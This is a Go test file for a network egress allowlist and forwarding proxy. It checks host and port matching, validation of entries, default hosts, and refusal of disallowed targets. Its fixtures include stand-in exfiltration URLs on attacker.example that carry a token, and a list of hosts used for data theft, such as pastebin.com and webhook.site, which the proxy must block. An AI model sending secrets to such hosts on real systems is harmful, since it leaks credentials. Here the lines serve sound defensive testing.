package egress

import (
	"crypto/tls"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

func TestAllowlistMatching(t *testing.T) {
	allow := New([]string{"api.github.com", ".githubusercontent.com", "", "  API.Anthropic.com. ", "host.docker.internal:8080"})
	cases := []struct {
		host, port string
		want       bool
	}{
		{"api.github.com", "443", true},
		{"API.GitHub.com", "443", true},     // clients vary in case; DNS does not
		{"api.anthropic.com", "443", true},  // normalized on the way in
		{"api.anthropic.com.", "443", true}, // trailing-dot absolute form
		{"api.github.com", "80", true},      // both default ports
		{"objects.githubusercontent.com", "443", true},
		{"githubusercontent.com", "443", true}, // the dotted form covers its own apex
		{"github.com", "443", false},           // exact entries do not imply the parent
		{"evil-api.github.com", "443", false},  // suffix match must respect the dot
		{"attacker.com", "443", false},
		{"", "443", false},

		// An allowlisted host is not a tunnel to every port it listens on.
		{"api.github.com", "22", false},
		{"api.github.com", "5432", false},
		{"host.docker.internal", "8080", true},
		{"host.docker.internal", "22", false},
		{"host.docker.internal", "443", false}, // an explicit port replaces the defaults
		{"api.github.com", "", false},

		// The caller splits host from port; Allows does no parsing, and the
		// unsplit form must not sneak through.
		{"api.github.com:443", "443", false},
	}
	for _, testCase := range cases {
		if got := allow.Allows(testCase.host, testCase.port); got != testCase.want {
			t.Errorf("Allows(%q, %q) = %v, want %v", testCase.host, testCase.port, got, testCase.want)
		}
	}
}

// An entry an operator mistyped permits nothing, which is safe but silent —
// so it has to be rejected where it is accepted, not discovered as a host
// that will not resolve.
func TestValidateRejectsWhatWouldPermitNothing(t *testing.T) {
	for _, entry := range []string{"example.com", "example.com:8080", "  api.github.com  ", ".example.com", "host.docker.internal:65535"} {
		if err := Validate(entry); err != nil {
			t.Errorf("Validate(%q) = %v, want nil", entry, err)
		}
	}
	for _, entry := range []string{
		"example.com:https",   // a scheme name where a port belongs
		"https://example.com", // a pasted URL
		"example.com/path",    // a host with a path
		"example.com:8080/",   // a URL's trailing slash
		"example.com:99999",   // outside the port range
		"example.com:0",       // ditto
		"example.com:-1",      // ditto, and a sign
		"user@example.com",    // not a host name
		"two hosts.example",   // ditto
		"exa\nmple.com",       // a newline in a host
		"exa\rmple.com",       // and a carriage return
		"::1",                 // IP literals are not host names
		"fe80::1",             // ditto, unbracketed
		"[fe80::1]:8080",      // ditto, bracketed
		"example..com",        // an empty label
		".",                   // punctuation, not a host
		"",                    // nothing at all
		":443",                // a port with no host
	} {
		if err := Validate(entry); err == nil {
			t.Errorf("Validate(%q) = nil, want a complaint", entry)
		}
	}

	// And the rejected ones really would have permitted nothing.
	allow := New([]string{"example.com:https", "example.com:99999", "[fe80::1]:8080", "."})
	for _, port := range []string{"80", "443", "99999", "8080"} {
		if allow.Allows("example.com", port) || allow.Allows("fe80::1", port) {
			t.Errorf("a malformed entry permitted something on port %s", port)
		}
	}
	// Entries() is the line an operator reads at boot to confirm the wall;
	// a rejected entry must leave nothing behind in it.
	if entries := allow.Entries(); len(entries) != 0 {
		t.Errorf("Entries() = %q, want nothing from entries that were all rejected", entries)
	}
}

// A port is validated as a number and matched as a string, so an entry whose
// intent is unambiguous is stored in the spelling a client will ask with
// rather than failed on a formality.
func TestPortSpellingIsCanonical(t *testing.T) {
	allow := New([]string{"example.com:0443", "other.example:+8080"})
	if !allow.Allows("example.com", "443") {
		t.Error("example.com:0443 must permit the port a client asks for, 443")
	}
	if !allow.Allows("other.example", "8080") {
		t.Error("other.example:+8080 must permit 8080")
	}
	for _, entry := range allow.Entries() {
		if strings.Contains(entry, "0443") || strings.Contains(entry, "+") {
			t.Errorf("Entries() shows an uncanonical port: %q", entry)
		}
	}
}

func TestDefaultHostsCoverTheWorkAndNothingElse(t *testing.T) {
	allow := New(DefaultHosts)
	for _, host := range []string{"api.anthropic.com", "github.com", "api.github.com", "proxy.golang.org"} {
		if !allow.Allows(host, "443") {
			t.Errorf("default allowlist refuses %q, which a loop needs", host)
		}
	}
	for _, host := range []string{"pastebin.com", "attacker.example", "webhook.site"} {
		if allow.Allows(host, "443") {
			t.Errorf("default allowlist permits %q", host)
		}
	}
	// The hub is not compiled in: it lives on the gateway on the operator's
	// own port, and the runtime supplies that entry when it creates the proxy.
	if allow.Allows("host.docker.internal", "443") {
		t.Error("the gateway must not be allowlisted by default")
	}
}

// A refused host never reaches the network: the proxy answers 403 with the
// host named, and no dial is attempted (ADR-0028).
func TestProxyRefusesHostOffTheAllowlist(t *testing.T) {
	proxy := NewProxy(New([]string{"allowed.example"}), nil)
	proxy.dial = func(string, string) (net.Conn, error) {
		t.Error("a refused host must not be dialed")
		return nil, io.EOF
	}
	front := httptest.NewServer(proxy)
	defer front.Close()

	resp, body := viaProxy(t, front.URL, "http://attacker.example/steal?token=sk-secret")
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("status = %d, want 403", resp.StatusCode)
	}
	if !strings.Contains(body, "attacker.example") || !strings.Contains(body, "allowlist") {
		t.Fatalf("refusal must say what was refused and why: %q", body)
	}
}

// An allowlisted host on a port it was not allowed on is refused before any
// dial: the gateway entry is the hub's port, not a tunnel to ssh or a
// database on the operator's machine (ADR-0028).
func TestProxyRefusesAllowedHostOnAnotherPort(t *testing.T) {
	proxy := NewProxy(New([]string{"gateway.example:8080"}), nil)
	proxy.dial = func(string, string) (net.Conn, error) {
		t.Error("a refused port must not be dialed")
		return nil, io.EOF
	}
	front := httptest.NewServer(proxy)
	defer front.Close()

	for _, target := range []string{"http://gateway.example:22/", "http://gateway.example:5432/", "http://gateway.example/"} {
		resp, body := viaProxy(t, front.URL, target)
		if resp.StatusCode != http.StatusForbidden {
			t.Errorf("%s: status = %d, want 403", target, resp.StatusCode)
		}
		if !strings.Contains(body, "allowlist") {
			t.Errorf("%s: refusal must say why: %q", target, body)
		}
	}
}

func TestProxyForwardsAllowedPlainHTTP(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Upstream", "yes")
		_, _ = io.WriteString(w, "hello from "+r.Host+r.URL.Path)
	}))
	defer upstream.Close()

	// The allowlist is checked on the name the client asked for; the dial
	// hook is what lets a test host name resolve to the stand-in server.
	proxy := NewProxy(New([]string{"allowed.example"}), nil)
	proxy.dial = dialTo(upstream.Listener.Addr().String())
	front := httptest.NewServer(proxy)
	defer front.Close()

	resp, body := viaProxy(t, front.URL, "http://allowed.example/work")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200", resp.StatusCode)
	}
	if resp.Header.Get("X-Upstream") != "yes" {
		t.Errorf("upstream headers must reach the client: %v", resp.Header)
	}
	if !strings.Contains(body, "/work") {
		t.Errorf("body = %q", body)
	}
}

// CONNECT is the path that carries every https call a loop makes: the proxy
// opens a tunnel and never sees inside it.
func TestProxyTunnelsAllowedTLS(t *testing.T) {
	upstream := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = io.WriteString(w, "tunnelled")
	}))
	defer upstream.Close()

	proxy := NewProxy(New([]string{"allowed.example"}), nil)
	proxy.dial = dialTo(upstream.Listener.Addr().String())
	front := httptest.NewServer(proxy)
	defer front.Close()

	proxyURL, err := url.Parse(front.URL)
	if err != nil {
		t.Fatal(err)
	}
	client := &http.Client{Transport: &http.Transport{
		Proxy:           http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // the stand-in server's cert is self-signed
	}}
	resp, err := client.Get("https://allowed.example/secret")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if string(body) != "tunnelled" {
		t.Fatalf("body = %q, want the upstream's own response through the tunnel", body)
	}

	resp2, err := client.Get("https://attacker.example/exfiltrate")
	if err == nil {
		defer resp2.Body.Close()
		t.Fatalf("a CONNECT to a refused host must fail, got %d", resp2.StatusCode)
	}
	// Go reports a failed CONNECT by the proxy's status text.
	if !strings.Contains(err.Error(), "Forbidden") {
		t.Fatalf("err = %v, want the proxy's refusal surfaced to the client", err)
	}
}

func viaProxy(t *testing.T, proxyBase, target string) (*http.Response, string) {
	t.Helper()
	proxyURL, err := url.Parse(proxyBase)
	if err != nil {
		t.Fatal(err)
	}
	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}}
	resp, err := client.Get(target)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatal(err)
	}
	return resp, string(body)
}

// dialTo sends every allowed dial to one address, standing in for the DNS the
// proxy would do in a container.
func dialTo(addr string) func(string, string) (net.Conn, error) {
	return func(network, _ string) (net.Conn, error) {
		return net.Dial(network, addr)
	}
}
